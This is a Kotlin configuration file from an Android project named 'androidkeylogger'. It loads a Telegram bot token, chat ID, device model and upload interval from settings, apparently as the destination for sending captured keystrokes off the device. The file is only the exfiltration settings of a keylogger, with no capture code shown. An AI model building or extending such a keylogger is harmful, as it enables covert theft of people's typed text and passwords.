package com.bshu2.androidkeylogger

import android.content.Context

/** Upload destination resolved from user settings; never build-time secrets. */
object TelegramConfig {
    data class Config(
        val botToken: String,
        val chatId: String,
        val deviceName: String,
        val intervalMs: Long
    ) {
        val isConfigured: Boolean
            get() = botToken.isNotEmpty() && chatId.isNotEmpty()
    }

    fun load(ctx: Context): Config = Config(
        botToken = Prefs.botToken(ctx),
        chatId = Prefs.chatId(ctx),
        deviceName = safe(android.os.Build.MODEL),
        intervalMs = Prefs.intervalMs(ctx)
    )

    private fun safe(s: String?): String =
        if (s.isNullOrEmpty()) "unknown" else s.replace('|', '/')
}
